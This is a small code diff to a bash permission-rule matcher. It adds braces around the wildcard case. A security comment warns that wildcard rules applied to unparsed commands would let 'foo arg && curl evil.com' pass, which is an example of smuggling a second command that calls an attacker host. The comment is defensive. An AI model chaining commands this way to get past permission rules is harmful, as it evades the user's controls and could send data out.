@@ -872,7 +872,7 @@ function filterRulesByContentsMatchingInput(
         switch (bashRule.type) {
           case 'exact':
             return bashRule.command === cmdToMatch
-          case 'wildcard':
+          case 'wildcard': {
             // SECURITY FIX: In exact match mode, wildcards must NOT match because we're
             // checking the full unparsed command. Wildcard matching on unparsed commands
             // allows "foo *" to match "foo arg && curl evil.com" since .* matches operators.
@@ -899,6 +899,7 @@ function filterRulesByContentsMatchingInput(
               return cmdToMatch === xargsPrefix || cmdToMatch.startsWith(`${xargsPrefix} `)
             }
             return false
+          }
         }
       })
     })
